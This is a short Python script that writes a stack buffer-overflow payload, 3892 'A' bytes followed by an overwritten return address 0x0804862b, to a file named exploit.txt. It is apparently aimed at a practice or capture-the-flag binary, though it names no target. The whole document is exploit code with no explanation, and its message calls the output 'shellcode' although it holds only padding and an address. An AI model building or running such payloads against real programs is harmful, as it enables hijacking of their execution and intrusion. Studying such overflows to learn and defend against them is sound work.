#!/usr/bin/python
ret = "\x2b\x86\x04\x08"  #00401530 0804862b
buffer = "A"*3892 + ret
 
print("Saving shellcode")
with open("exploit.txt", 'wt') as f:
    f.write(buffer)
